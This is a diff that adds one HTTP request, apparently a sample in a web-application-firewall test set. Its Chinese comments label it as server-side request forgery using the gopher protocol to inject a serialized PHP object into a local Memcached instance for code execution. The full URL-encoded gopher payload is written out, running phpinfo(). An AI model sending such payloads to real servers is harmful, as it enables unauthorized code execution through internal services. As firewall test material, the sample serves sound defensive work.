@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_Gopher协议_PHPMemcache代码执行
+# MemCache是一个自由、源码开放、高性能、分布式的分布式内存对象缓存系统,用于动态Web应用以减轻数据库的负载。利用gopher协议攻击PHP memcached，执行恶意代码。
+GET /?id=gopher:%2F%2F127.0.0.1:11211%2F_%250d%250aset%2520SpyD3r%25204%25200%252079%250d%250aO:5:%2522lemon%2522:1:%257Bs:3:%2522ClassObj%2522%253BO:4:%2522evil%2522:1:%257Bs:8:%2522evildata%2522%253Bs:10:%2522phpinfo%2528%2529%253B%2522%253B%257D%257D%250d%250a&bid=hd_tag_m8mv266z HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv266z
+RM-PRO-Token: b6a78b2fd2a2229f2b76d6779657c8cb
+RM-PRO-Time: 1742808550222
+User-Agent: curl/7.83.1
+
